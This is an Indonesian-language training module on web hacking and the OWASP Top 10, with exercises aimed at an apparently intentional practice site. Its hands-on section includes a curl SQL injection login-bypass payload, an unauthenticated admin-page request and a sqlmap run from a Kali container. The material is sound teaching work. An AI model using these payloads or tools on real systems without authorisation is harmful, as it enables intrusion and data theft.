# 🛡️ Pertemuan 6: Web Hacking & OWASP Top 10

**Tujuan:** Memahami sepuluh besar kerentanan aplikasi web menurut standar OWASP dan mempraktikkan teknik audit keamanan web secara terstruktur.

---

## 📚 Materi Teori: OWASP Top 10 (2021)

| Kode    | Nama                          | Deskripsi Singkat                                     |
| ------- | ----------------------------- | ----------------------------------------------------- |
| **A01** | **Broken Access Control**     | Pengguna bisa mengakses data yang bukan haknya.       |
| **A02** | **Cryptographic Failures**    | Kegagalan enkripsi atau kebocoran data sensitif.      |
| **A03** | **Injection**                 | Input berbahaya (SQL, XSS) yang diproses sistem.      |
| **A04** | **Insecure Design**           | Kelemahan pada arsitektur dan desain awal.            |
| **A05** | **Security Misconfiguration** | Kesalahan setelan server atau debug mode aktif.       |
| **A06** | **Vulnerable Components**     | Menggunakan library/framework versi lama yang cacat.  |
| **A07** | **Auth Failures**             | Kelemahan pada sistem login dan manajemen sesi.       |
| **A08** | **Integrity Failures**        | Kurangnya validasi integritas software/data.          |
| **A09** | **Logging Failures**          | Kurangnya pencatatan aktivitas mencurigakan.          |
| **A10** | **SSRF**                      | Server dipaksa melakukan request ke internal network. |

---

## 🛠️ Hands-on Practice

### 1. Injection (A03) & Access Control (A01)
Targets: [Hackable Pentest Web](https://hackable-pentest.vercel.app)

```bash
# Cek halaman admin tanpa login
curl https://hackable-pentest.vercel.app/admin

# Injeksi SQL login manual
curl -X POST https://hackable-pentest.vercel.app/api/login -d "username=admin' -- -&password=test"
```

### 2. Audit Komponen (A06)
Jika mengaudit aplikasi berbasis Node.js:
```bash
npm audit
```

### 3. Security Misconfiguration (A05)
Cari informasi server melalui header:
```bash
curl -I https://hackable-pentest.vercel.app
```

---

## 📄 Reporting & Templates
Laporan profesional harus mengikuti standar industri. Gunakan template berikut sebagai referensi:
- **Template Laporan Pentest (Indo)**: [https://docs.google.com/document/d/1Uar2BahFKRHPhia_OQ6tA0wKSE46tG31z3ItGNpsInI/edit](https://docs.google.com/document/d/1Uar2BahFKRHPhia_OQ6tA0wKSE46tG31z3ItGNpsInI/edit)
- **Template Laporan Pentest (Eng)**: [https://docs.google.com/document/d/1M8hRmzCLA9uPes7uhJ355JLUylVUBSspFWDfIqmUqmA/edit](https://docs.google.com/document/d/1M8hRmzCLA9uPes7uhJ355JLUylVUBSspFWDfIqmUqmA/edit)

---

## 🐳 Step-by-Step: Docker Kali Linux Lab
Lakukan audit keamanan aplikasi web dengan langkah-langkah berikut:

1.  **Persiapan**: Siapkan URL target (misal: `https://hackable-pentest.vercel.app`).
2.  **Jalankan Container**:
    ```bash
    docker run -it --rm kalilinux/kali-rolling /bin/bash
    ```
3.  **Update & Install**: Instal tools pendukung audit web:
    ```bash
    apt update && apt install -y sqlmap curl
    ```
4.  **Verifikasi**: Tes koneksi ke target dari dalam container:
    ```bash
    curl -I https://hackable-pentest.vercel.app
    ```
5.  **Eksplorasi**: Jalankan `sqlmap -u "<URL>"` untuk mulai menguji kerentanan SQL Injection.

## 📖 Referensi
- **OWASP Official Website**: [owasp.org](https://owasp.org/www-project-top-ten/)
- **PortSwigger Web Security Academy**: [portswigger.net/web-security](https://portswigger.net/web-security)
- **Burp Suite & ZAP Proxies**.
